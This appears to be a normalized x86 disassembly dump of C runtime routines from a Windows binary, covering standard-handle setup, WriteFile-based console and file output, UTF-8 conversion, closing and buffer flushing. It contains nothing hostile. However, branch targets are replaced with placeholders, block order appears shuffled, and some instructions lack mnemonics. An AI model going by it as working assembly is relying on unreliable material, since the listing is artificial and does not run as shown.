[ edi ] eax
xor eax eax
mov [ esi + 0x4 ] eax
mov [ esi ] eax
mov [ esi + 0x8 ] eax
sub_413862
mov edi edi
push ebp
mov ebp esp
sub esp 0x48
lea eax [ ebp - 0x48 ]
push eax
call [ GetStartupInfoW@IAT ]
cmp [ ebp - 0x16 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x14 ]
test eax eax
je r-xdata
push ebx
push esi
mov esi [ eax ]
lea ebx [ eax + 0x4 ]
lea eax [ ebx + esi ]
mov [ ebp - 0x4 ] eax
mov eax 0x2000
cmp esi eax
jl r-xdata
push esi
call sub_41715a
mov eax [ rw-data ]
pop ecx
cmp esi eax
jle r-xdata
mov esi eax
push edi
xor edi edi
test esi esi
je r-xdata
mov esi eax
pop edi
pop esi
pop ebx
mov eax [ ebp - 0x4 ]
inc edi
add eax 0x4
inc ebx
mov [ ebp - 0x4 ] eax
cmp edi esi
jne r-xdata
cmp ecx 0xfffffffe
je r-xdata
mov ecx [ eax ]
cmp ecx 0xffffffff
je r-xdata
mov dl [ ebx ]
test dl 0x1
je r-xdata
test dl 0x8
jne r-xdata
mov eax edi
mov ecx edi
and eax 0x3f
sar ecx 0x6
imul edx eax 0x30
mov eax [ ebp - 0x4 ]
add edx [ ecx * 4 + rw-data ]
mov eax [ eax ]
mov [ edx + 0x18 ] eax
mov al [ ebx ]
mov [ edx + 0x28 ] al
push ecx
call [ GetFileType@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
sub_413918
mov edi edi
push ebx
push esi
push edi
xor edi edi
mov eax edi
mov [ esi + 0x28 ] 0x81
sub eax 0x0
je r-xdata
cmp [ esi + 0x18 ] 0xfffffffe
je r-xdata
push 0xfffffff6
sub eax 0x1
je r-xdata
or [ esi + 0x28 ] 0x80
jmp r-xdata
xor eax eax
test ebx ebx
je r-xdata
push 0xfffffff5
jmp r-xdata
push 0xfffffff4
sub eax 0x1
jmp r-xdata
inc edi
cmp edi 0x3
jne r-xdata
or [ esi + 0x28 ] 0x40
mov [ esi + 0x18 ] 0xfffffffe
mov eax [ rw-data ]
test eax eax
je r-xdata
and eax 0xff
mov [ esi + 0x18 ] ebx
cmp eax 0x2
jne r-xdata
push ebx
call [ GetFileType@IAT ]
jmp r-xdata
pop eax
push eax
call [ GetStdHandle@IAT ]
mov ebx eax
cmp ebx 0xffffffff
je r-xdata
mov eax edi
mov ecx edi
and eax 0x3f
sar ecx 0x6
imul esi eax 0x30
add esi [ ecx * 4 + rw-data ]
cmp [ esi + 0x18 ] 0xffffffff
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + edi * 4 ]
mov [ eax + 0x10 ] 0xfffffffe
cmp eax 0x3
jne r-xdata
or [ esi + 0x28 ] 0x40
jmp r-xdata
test eax eax
je r-xdata
or [ esi + 0x28 ] 0x8
jmp r-xdata
sub_4139ce
push 0xc
push r--data
call sub_40b2f0
push 0x7
call sub_4129a2
pop ecx
xor ebx ebx
mov [ ebp - 0x19 ] bl
mov [ ebp - 0x4 ] ebx
push ebx
call sub_41715a
pop ecx
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_413a1b
mov al bl
call sub_40b336
retn
call sub_413862
call sub_413918
mov bl 0x1
mov [ ebp - 0x19 ] bl
sub_413a26
push esi
xor esi esi
add esi 0x4
cmp esi 0x200
jb r-xdata
push eax
call sub_417125
and [ esi + rw-data ] 0x0
pop ecx
mov eax [ esi + rw-data ]
test eax eax
je r-xdata
mov al 0x1
pop esi
retn
sub_413a50
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov [ eax ] ecx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] ecx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x8 ] ecx
mov eax [ ebp + 0x8 ]
or [ eax + 0x10 ] 0xffffffff
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] ecx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x18 ] ecx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x1c ] ecx
mov eax [ ebp + 0x8 ]
add eax 0xc
xchg [ eax ] ecx
pop ebp
retn
sub_413a8b
push 0xc
push r--data
call sub_40b2f0
and [ ebp - 0x1c ] 0x0
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_4171f2
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov esi [ eax ]
mov edx esi
sar edx 0x6
mov eax esi
and eax 0x3f
imul ecx eax 0x30
mov eax [ edx * 4 + rw-data ]
test [ eax + ecx + 0x28 ] 0x1
je r-xdata
call sub_4135e3
mov [ eax ] 0x9
or esi 0xffffffff
push esi
call sub_413bb4
pop ecx
mov esi eax
jmp r-xdata
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_413b01
mov eax esi
call sub_40b336
retn 0xc
sub_413b0d
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x1 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
push eax
call sub_413a8b
mov esp ebp
pop ebp
retn
sub_413b35
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0x8 ]
cmp esi 0xfffffffe
jne r-xdata
test esi esi
js r-xdata
call sub_4135d0
and [ eax ] 0x0
call sub_4135e3
mov [ eax ] 0x9
jmp r-xdata
call sub_4135d0
and [ eax ] 0x0
call sub_4135e3
mov [ eax ] 0x9
call sub_413527
cmp esi [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov eax esi
mov edx esi
and eax 0x3f
sar edx 0x6
imul ecx eax 0x30
mov eax [ edx * 4 + rw-data ]
test [ eax + ecx + 0x28 ] 0x1
je r-xdata
lea eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x4 ]
push eax
push esi
call sub_413b0d
pop ecx
pop ecx
jmp r-xdata
pop esi
mov esp ebp
pop ebp
retn
sub_413bb4
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
push edi
call sub_4172c9
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov eax [ rw-data ]
cmp edi 0x1
jne r-xdata
xor esi esi
jmp r-xdata
cmp edi 0x2
jne r-xdata
test [ eax + 0x88 ] 0x1
jne r-xdata
push edi
call sub_417238
pop ecx
mov ecx edi
and edi 0x3f
sar ecx 0x6
imul edx edi 0x30
mov ecx [ ecx * 4 + rw-data ]
mov [ ecx + edx + 0x28 ] 0x0
test esi esi
je r-xdata
push edi
call sub_4172c9
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
test [ eax + 0x58 ] 0x1
je r-xdata
push 0x2
call sub_4172c9
push 0x1
mov esi eax
call sub_4172c9
pop ecx
pop ecx
cmp eax esi
je r-xdata
xor eax eax
push esi
call sub_4135ad
pop ecx
or eax 0xffffffff
jmp r-xdata
call [ GetLastError@IAT ]
mov esi eax
pop edi
pop esi
pop ebp
retn
sub_413c50
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov eax [ eax + 0x10 ]
pop ebp
retn
call sub_4135e3
mov [ eax ] 0x16
call sub_413527
or eax 0xffffffff
pop ebp
retn
sub_413c76
mov edi edi
push ebp
mov ebp esp
sub esp 0x38
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
mov ecx eax
and eax 0x3f
sar ecx 0x6
push ebx
imul ebx eax 0x30
push esi
mov eax [ ecx * 4 + rw-data ]
push edi
mov edi [ ebp + 0x10 ]
mov [ ebp - 0x30 ] edi
mov [ ebp - 0x2c ] ecx
mov eax [ eax + ebx + 0x18 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x14 ]
add eax edi
mov [ ebp - 0x24 ] eax
call [ GetConsoleCP@IAT ]
mov esi [ ebp + 0x8 ]
mov ecx [ ebp - 0x24 ]
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
cmp edi ecx
jae r-xdata
mov ecx [ ebp - 0x4 ]
mov eax esi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40a8ab
mov esp ebp
pop ebp
retn
mov ch [ edi ]
xor eax eax
mov [ ebp - 0x18 ] ax
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x1b ] ch
mov edx [ eax * 4 + rw-data ]
mov cl [ edx + ebx + 0x2d ]
test cl 0x4
je r-xdata
call sub_417333
movzx ecx [ edi ]
mov edx 0x8000
test [ eax + ecx * 2 ] dx
je r-xdata
mov al [ edx + ebx + 0x2e ]
and cl 0xfb
mov [ ebp - 0xc ] al
lea eax [ ebp - 0xc ]
push 0x2
mov [ ebp - 0xb ] ch
mov [ edx + ebx + 0x2d ] cl
push eax
jmp r-xdata
push 0x1
push edi
cmp edi [ ebp - 0x24 ]
jae r-xdata
lea eax [ ebp - 0x18 ]
push eax
call sub_414b56
add esp 0xc
cmp eax 0xffffffff
je r-xdata
xor ecx ecx
lea eax [ ebp - 0x14 ]
push ecx
push ecx
push 0x5
push eax
push 0x1
lea eax [ ebp - 0x18 ]
inc edi
push eax
push ecx
push [ ebp - 0x38 ]
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x34 ] eax
test eax eax
je r-xdata
mov edx [ ebp - 0x2c ]
mov al [ edi ]
mov ecx [ edx * 4 + rw-data ]
mov [ ecx + ebx + 0x2e ] al
mov eax [ edx * 4 + rw-data ]
or [ eax + ebx + 0x2d ] 0x4
inc [ esi + 0x4 ]
jmp r-xdata
push 0x2
lea eax [ ebp - 0x18 ]
push edi
push eax
call sub_414b56
add esp 0xc
cmp eax 0xffffffff
je r-xdata
push 0x0
lea ecx [ ebp - 0x20 ]
push ecx
push eax
lea eax [ ebp - 0x14 ]
push eax
push [ ebp - 0x28 ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
inc edi
jmp r-xdata
call [ GetLastError@IAT ]
mov [ esi ] eax
mov eax [ esi + 0x8 ]
sub eax [ ebp - 0x30 ]
add eax edi
mov [ esi + 0x4 ] eax
mov eax [ ebp - 0x34 ]
cmp [ ebp - 0x20 ] eax
jb r-xdata
cmp [ ebp - 0x1b ] 0xa
jne r-xdata
cmp edi [ ebp - 0x24 ]
jb r-xdata
push 0xd
pop eax
push 0x0
mov [ ebp - 0x1c ] ax
lea eax [ ebp - 0x20 ]
push eax
push 0x1
lea eax [ ebp - 0x1c ]
push eax
push [ ebp - 0x28 ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
jmp r-xdata
cmp [ ebp - 0x20 ] 0x1
jb r-xdata
inc [ esi + 0x8 ]
inc [ esi + 0x4 ]
sub_413e29
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
push edi
mov edi [ ebp + 0xc ]
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x10 ]
add eax edi
mov [ ebp - 0x4 ] eax
cmp edi eax
jae r-xdata
pop edi
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
movzx ebx [ edi ]
push ebx
call sub_418a87
pop ecx
cmp ax bx
jne r-xdata
call [ GetLastError@IAT ]
mov [ esi ] eax
add [ esi + 0x4 ] 0x2
cmp ebx 0xa
jne r-xdata
add edi 0x2
cmp edi [ ebp - 0x4 ]
jb r-xdata
push 0xd
pop ebx
push ebx
call sub_418a87
pop ecx
cmp ax bx
jne r-xdata
jmp r-xdata
inc [ esi + 0x4 ]
inc [ esi + 0x8 ]
sub_413e96
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0x8 ]
push esi
call sub_418878
pop ecx
test eax eax
jne r-xdata
push edi
mov edi esi
and esi 0x3f
sar edi 0x6
imul esi esi 0x30
mov eax [ edi * 4 + rw-data ]
test [ eax + esi + 0x28 ] 0x80
je r-xdata
xor al al
jmp r-xdata
xor al al
jmp r-xdata
call sub_41320e
mov eax [ eax + 0x4c ]
cmp [ eax + 0xa8 ] 0x0
jne r-xdata
pop esi
mov esp ebp
pop ebp
retn
pop edi
lea eax [ ebp - 0x4 ]
push eax
mov eax [ edi * 4 + rw-data ]
push [ eax + esi + 0x18 ]
call [ GetConsoleMode@IAT ]
test eax eax
setne al
mov eax [ edi * 4 + rw-data ]
cmp [ eax + esi + 0x29 ] 0x0
jne r-xdata
sub_413f0c
mov edi edi
push ebp
mov ebp esp
mov eax 0x1410
call sub_40a8c0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0xc ]
mov eax ecx
sar eax 0x6
and ecx 0x3f
imul ecx ecx 0x30
push ebx
mov ebx [ ebp + 0x10 ]
mov eax [ eax * 4 + rw-data ]
push esi
mov esi [ ebp + 0x8 ]
push edi
mov ecx [ eax + ecx + 0x18 ]
mov eax [ ebp + 0x14 ]
and [ esi ] 0x0
add eax ebx
and [ esi + 0x4 ] 0x0
and [ esi + 0x8 ] 0x0
mov [ ebp - 0x1410 ] ecx
mov [ ebp - 0x1408 ] eax
jmp r-xdata
cmp ebx eax
jb r-xdata
lea edi [ ebp - 0x1404 ]
jmp r-xdata
lea eax [ ebp - 0x1404 ]
sub edi eax
lea eax [ ebp - 0x140c ]
push 0x0
push eax
push edi
lea eax [ ebp - 0x1404 ]
push eax
push ecx
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov al [ ebx ]
inc ebx
cmp al 0xa
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov eax esi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40a8ab
mov esp ebp
pop ebp
retn
call [ GetLastError@IAT ]
mov [ esi ] eax
mov eax [ ebp - 0x140c ]
add [ esi + 0x4 ] eax
cmp eax edi
jb r-xdata
mov [ edi ] al
lea eax [ ebp - 0x5 ]
inc edi
cmp edi eax
mov eax [ ebp - 0x1408 ]
jb r-xdata
inc [ esi + 0x8 ]
mov [ edi ] 0xd
inc edi
mov eax [ ebp - 0x1408 ]
mov ecx [ ebp - 0x1410 ]
cmp ebx eax
jae r-xdata
sub_413feb
mov edi edi
push ebp
mov ebp esp
mov eax 0x1410
call sub_40a8c0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0xc ]
mov eax ecx
sar eax 0x6
and ecx 0x3f
imul ecx ecx 0x30
push ebx
mov ebx [ ebp + 0x10 ]
mov eax [ eax * 4 + rw-data ]
push esi
mov esi [ ebp + 0x8 ]
push edi
mov ecx [ eax + ecx + 0x18 ]
mov eax [ ebp + 0x14 ]
add eax ebx
mov [ ebp - 0x1410 ] ecx
xor edx edx
mov [ ebp - 0x1408 ] eax
mov [ esi ] edx
mov [ esi + 0x4 ] edx
mov [ esi + 0x8 ] edx
jmp r-xdata
cmp ebx eax
jb r-xdata
lea edi [ ebp - 0x1404 ]
jmp r-xdata
lea eax [ ebp - 0x1404 ]
sub edi eax
lea eax [ ebp - 0x140c ]
push 0x0
push eax
and edi 0xfffffffe
lea eax [ ebp - 0x1404 ]
push edi
push eax
push ecx
call [ WriteFile@IAT ]
test eax eax
je r-xdata
movzx eax [ ebx ]
add ebx 0x2
cmp eax 0xa
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov eax esi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40a8ab
mov esp ebp
pop ebp
retn
call [ GetLastError@IAT ]
mov [ esi ] eax
mov eax [ ebp - 0x140c ]
add [ esi + 0x4 ] eax
cmp eax edi
jb r-xdata
mov [ edi ] ax
lea eax [ ebp - 0x6 ]
add edi 0x2
cmp edi eax
mov eax [ ebp - 0x1408 ]
jb r-xdata
add [ esi + 0x8 ] 0x2
push 0xd
pop edx
mov [ edi ] dx
add edi 0x2
mov eax [ ebp - 0x1408 ]
mov ecx [ ebp - 0x1410 ]
cmp ebx eax
jae r-xdata
sub_4140d9
mov edi edi
push ebp
mov ebp esp
mov eax 0x1418
call sub_40a8c0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0xc ]
mov eax ecx
sar eax 0x6
and ecx 0x3f
imul ecx ecx 0x30
push ebx
push esi
mov eax [ eax * 4 + rw-data ]
xor ebx ebx
mov esi [ ebp + 0x8 ]
push edi
mov eax [ eax + ecx + 0x18 ]
mov ecx [ ebp + 0x10 ]
mov edi ecx
mov [ ebp - 0x1414 ] eax
mov eax [ ebp + 0x14 ]
add eax ecx
mov [ esi ] ebx
mov [ esi + 0x4 ] ebx
mov [ ebp - 0x140c ] eax
mov [ esi + 0x8 ] ebx
cmp ecx eax
jae r-xdata
mov ecx [ ebp - 0x4 ]
mov eax esi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40a8ab
mov esp ebp
pop ebp
retn
mov esi [ ebp - 0x140c ]
lea eax [ ebp - 0x6b0 ]
push ebx
push ebx
push 0xd55
lea ecx [ ebp - 0x1408 ]
push ecx
lea ecx [ ebp - 0x6b0 ]
sub eax ecx
sar eax 0x1
push eax
mov eax ecx
push eax
push ebx
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x1418 ] eax
test eax eax
je r-xdata
movzx ecx [ edi ]
add edi 0x2
cmp ecx 0xa
jne r-xdata
call [ GetLastError@IAT ]
mov [ esi ] eax
push 0x0
lea ecx [ ebp - 0x1410 ]
sub eax ebx
push ecx
push eax
lea eax [ ebp - 0x1408 ]
add eax ebx
push eax
push [ ebp - 0x1414 ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov [ eax ] cx
add eax 0x2
lea ecx [ ebp - 0x8 ]
cmp eax ecx
jb r-xdata
push 0xd
pop edx
mov [ eax ] dx
add eax 0x2
add ebx [ ebp - 0x1410 ]
mov eax [ ebp - 0x1418 ]
cmp ebx eax
jb r-xdata
cmp edi esi
jae r-xdata
mov eax edi
sub eax [ ebp + 0x10 ]
mov [ esi + 0x4 ] eax
cmp edi [ ebp - 0x140c ]
jae r-xdata
xor ebx ebx
jmp r-xdata
sub_414206
push 0x14
push r--data
call sub_40b2f0
mov esi [ ebp + 0x8 ]
cmp esi 0xfffffffe
jne r-xdata
test esi esi
js r-xdata
call sub_4135d0
and [ eax ] 0x0
call sub_4135e3
mov [ eax ] 0x9
jmp r-xdata
call sub_4135d0
and [ eax ] 0x0
call sub_4135e3
mov [ eax ] 0x9
call sub_413527
cmp esi [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov ebx esi
sar ebx 0x6
mov eax esi
and eax 0x3f
imul ecx eax 0x30
mov [ ebp - 0x20 ] ecx
mov eax [ ebx * 4 + rw-data ]
movzx eax [ eax + ecx + 0x28 ]
and eax 0x1
je r-xdata
push esi
call sub_4171f2
pop ecx
or edi 0xffffffff
mov [ ebp - 0x1c ] edi
and [ ebp - 0x4 ] 0x0
mov eax [ ebx * 4 + rw-data ]
mov ecx [ ebp - 0x20 ]
test [ eax + ecx + 0x28 ] 0x1
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_4142f1
add esp 0xc
mov edi eax
mov [ ebp - 0x1c ] edi
call sub_4135e3
mov [ eax ] 0x9
call sub_4135d0
and [ eax ] 0x0
jmp r-xdata
call sub_40b336
retn
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4142c8
mov eax edi
jmp r-xdata
sub_4142f1
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x8 ] ecx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0xc ]
mov [ ebp - 0x30 ] edi
test ecx ecx
jne r-xdata
test edi edi
jne r-xdata
xor eax eax
jmp r-xdata
push ebx
mov eax esi
mov ebx esi
sar ebx 0x6
and eax 0x3f
imul edx eax 0x30
mov [ ebp - 0x1c ] ebx
mov eax [ ebx * 4 + rw-data ]
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x18 ] edx
mov bl [ eax + edx + 0x29 ]
cmp bl 0x2
je r-xdata
call sub_4135d0
and [ eax ] edi
call sub_4135e3
mov [ eax ] 0x16
call sub_413527
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_40a8ab
mov esp ebp
pop ebp
retn
mov eax ecx
not eax
test al 0x1
jne r-xdata
cmp bl 0x1
jne r-xdata
mov eax [ ebp - 0x2c ]
call sub_4135d0
and [ eax ] 0x0
call sub_4135e3
mov [ eax ] 0x16
call sub_413527
jmp r-xdata
test [ eax + edx + 0x28 ] 0x20
je r-xdata
push esi
call sub_413e96
pop ecx
test al al
je r-xdata
push 0x2
push 0x0
push 0x0
push esi
call sub_418a6c
add esp 0x10
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x1c ]
mov ecx [ eax * 4 + rw-data ]
mov eax [ ebp - 0x18 ]
test [ ecx + eax + 0x28 ] 0x80
je r-xdata
test bl bl
je r-xdata
pop ebx
mov eax [ ecx + eax + 0x18 ]
xor ecx ecx
push ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
lea ecx [ ebp - 0x10 ]
push ecx
push [ ebp - 0x8 ]
push edi
push eax
call [ WriteFile@IAT ]
test eax eax
jne r-xdata
movsx eax bl
sub eax 0x0
je r-xdata
push [ ebp - 0x8 ]
lea eax [ ebp - 0x14 ]
push edi
push esi
push eax
call sub_413c76
dec bl
cmp bl 0x1
ja r-xdata
lea esi [ ebp - 0x14 ]
call [ GetLastError@IAT ]
mov [ ebp - 0x14 ] eax
push [ ebp - 0x8 ]
lea eax [ ebp - 0x14 ]
push edi
push esi
push eax
call sub_413f0c
jmp r-xdata
sub eax 0x1
je r-xdata
mov esi eax
jmp r-xdata
mov eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x18 ]
mov eax [ eax * 4 + rw-data ]
test [ eax + ecx + 0x28 ] 0x40
je r-xdata
push [ ebp - 0x8 ]
lea eax [ ebp - 0x14 ]
push edi
push eax
call sub_413e29
add esp 0xc
sub eax [ ebp - 0x20 ]
mov eax [ ebp - 0x28 ]
test eax eax
je r-xdata
add esp 0x10
jmp r-xdata
push [ ebp - 0x8 ]
lea eax [ ebp - 0x14 ]
push edi
push esi
push eax
call sub_4140d9
jmp r-xdata
sub eax 0x1
jne r-xdata
lea edi [ ebp - 0x28 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x24 ]
test eax eax
jne r-xdata
call sub_4135e3
mov [ eax ] 0x1c
call sub_4135d0
and [ eax ] 0x0
cmp [ edi ] 0x1a
jne r-xdata
mov edi [ ebp - 0x30 ]
push 0x5
pop esi
cmp eax esi
jne r-xdata
push [ ebp - 0x8 ]
lea eax [ ebp - 0x14 ]
push edi
push esi
push eax
call sub_413feb
jmp r-xdata
xor eax eax
jmp r-xdata
push eax
call sub_4135ad
pop ecx
jmp r-xdata
call sub_4135e3
mov [ eax ] 0x9
call sub_4135d0
mov [ eax ] esi
jmp r-xdata
sub_4144fd
mov edi edi
push ebp
mov ebp esp
push edi
push [ ebp + 0xc ]
call sub_413c50
pop ecx
mov ecx [ ebp + 0xc ]
mov edi eax
mov ecx [ ecx + 0xc ]
test cl 0x6
jne r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax + 0xc ]
shr eax 0xc
test al 0x1
je r-xdata
call sub_4135e3
mov [ eax ] 0x9
mov eax [ ebp + 0xc ]
mov eax [ eax + 0xc ]
test al 0x1
je r-xdata
call sub_4135e3
mov [ eax ] 0x22
jmp r-xdata
pop edi
pop ebp
retn
mov eax [ ebp + 0xc ]
push ebx
push 0x2
pop ebx
add eax 0xc
[ eax ] ebx
mov eax [ ebp + 0xc ]
push 0xfffffff7
pop ecx
add eax 0xc
[ eax ] ecx
mov eax [ ebp + 0xc ]
and [ eax + 0x8 ] 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax + 0xc ]
test eax 0x4c0
jne r-xdata
mov eax [ ebp + 0xc ]
and [ eax + 0x8 ] 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax + 0xc ]
shr eax 0x3
test al 0x1
mov eax [ ebp + 0xc ]
je r-xdata
mov eax [ ebp + 0xc ]
push [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
push ebx
call sub_41460e
pop ecx
pop ecx
test al al
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
push 0x1
call sub_40e5f8
pop ecx
cmp esi eax
je r-xdata
push 0x10
pop ecx
add eax 0xc
[ eax ] ecx
or eax 0xffffffff
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov [ eax ] ecx
mov eax [ ebp + 0xc ]
push 0xfffffffe
pop ecx
add eax 0xc
[ eax ] ecx
movzx eax bl
mov eax [ ebp + 0xc ]
push 0x10
pop ecx
add eax 0xc
[ eax ] ecx
or eax 0xffffffff
jmp r-xdata
push edi
call sub_418878
pop ecx
test eax eax
jne r-xdata
mov esi [ ebp + 0xc ]
push ebx
call sub_40e5f8
pop ecx
cmp esi eax
jne r-xdata
pop ebx
pop esi
push [ ebp + 0xc ]
call sub_418acc
pop ecx
sub_41460e
mov edi edi
push ebp
mov ebp esp
push esi
push edi
push [ ebp + 0xc ]
call sub_413c50
pop ecx
mov ecx [ ebp + 0xc ]
mov edx eax
mov ecx [ ecx + 0xc ]
test cl 0xc0
je r-xdata
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push edx
call sub_414206
add esp 0xc
dec eax
neg eax
sbb eax eax
inc eax
mov ecx [ ebp + 0xc ]
xor edi edi
mov eax [ ecx + 0x4 ]
mov esi [ ecx ]
sub esi eax
inc eax
mov [ ecx ] eax
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x18 ]
dec ecx
mov [ eax + 0x8 ] ecx
test esi esi
jle r-xdata
cmp edx 0xffffffff
je r-xdata
mov eax [ ebp + 0xc ]
push esi
push [ eax + 0x4 ]
push edx
call sub_414206
add esp 0xc
mov edi eax
mov eax rw-data
cmp edx 0xfffffffe
je r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x4 ]
mov al [ ebp + 0x8 ]
mov [ ecx ] al
xor eax eax
cmp edi esi
sete al
jmp r-xdata
push 0x2
push edi
push edi
push edx
call sub_418a51
and eax edx
add esp 0x10
cmp eax 0xffffffff
jne r-xdata
mov eax edx
mov ecx edx
and eax 0x3f
sar ecx 0x6
imul eax eax 0x30
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
mov eax [ ebp + 0xc ]
push 0x10
pop ecx
add eax 0xc
[ eax ] ecx
mov al 0x1
jmp r-xdata
test [ eax + 0x28 ] 0x20
je r-xdata
sub_4146e5
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push esi
call sub_413c50
push eax
call sub_418878
pop ecx
pop ecx
test eax eax
jne r-xdata
push ebx
push edi
push 0x1
call sub_40e5f8
pop ecx
push 0x2
pop ebx
cmp esi eax
jne r-xdata
xor al al
jmp r-xdata
push ebx
call sub_40e5f8
pop ecx
cmp esi eax
jne r-xdata
mov edi rw-data
jmp r-xdata
pop esi
pop ebp
retn
xor al al
mov edi rw-data
inc [ rw-data ]
lea ecx [ esi + 0xc ]
mov eax [ ecx ]
test eax 0x4c0
jne r-xdata
mov eax 0x282
[ ecx ] eax
mov eax [ edi ]
test eax eax
jne r-xdata
mov [ esi + 0x4 ] eax
mov eax [ edi ]
mov [ esi ] eax
mov [ esi + 0x8 ] 0x1000
mov [ esi + 0x18 ] 0x1000
push 0x1000
call sub_411e67
push 0x0
mov [ edi ] eax
call sub_411e2d
mov eax [ edi ]
pop ecx
pop ecx
test eax eax
jne r-xdata
pop edi
pop ebx
lea ecx [ esi + 0x14 ]
mov [ esi + 0x8 ] ebx
mov [ esi + 0x4 ] ecx
mov [ esi ] ecx
mov [ esi + 0x18 ] ebx
jmp r-xdata
mov al 0x1
jmp r-xdata
sub_41479a
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn
push esi
mov esi [ ebp + 0xc ]
push edi
lea edi [ esi + 0xc ]
mov eax [ edi ]
shr eax 0x9
test al 0x1
je r-xdata
pop edi
pop esi
push esi
call sub_413696
pop ecx
mov eax 0xfffffd7f
[ edi ] eax
xor eax eax
mov [ esi + 0x18 ] eax
mov [ esi + 0x4 ] eax
mov [ esi ] eax
sub_4147d3
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_40ee04
lea eax [ ebp - 0xc ]
push eax
push 0x4
push [ ebp + 0x8 ]
call sub_41292e
add esp 0xc
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x350 ] 0xfffffffd
sub_41480b
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ rw-data ]
movzx eax [ eax + ecx * 2 ]
and eax 0x4
pop ebp
retn
push 0x0
push [ ebp + 0x8 ]
